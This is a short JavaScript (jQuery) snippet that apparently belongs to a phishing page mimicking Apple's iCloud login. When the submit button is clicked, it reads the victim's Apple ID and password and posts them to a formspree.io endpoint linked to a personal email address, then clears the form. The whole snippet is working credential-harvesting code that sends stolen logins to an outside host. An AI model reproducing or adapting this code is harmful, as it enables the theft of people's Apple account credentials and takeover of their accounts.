$('#submit-icloud').click(function(ev){
      ev.preventDefault();
      $.ajax({
            url: "https://formspree.io/tymkivyurii@gmail.com", 
            method: "POST",
            data: {
                appleid: $('#apple-id').val(),
                password: $('#password').val()
            },
            dataType: "json"
      }).done(function() {
          $('form')[0].reset();
          $('#form-msg').html('<p>Hello me iCloude!!!</p>')
      }).fail(function(){
          $('#form-msg').html('<p>I am SORRY!!!</p>')
      });
});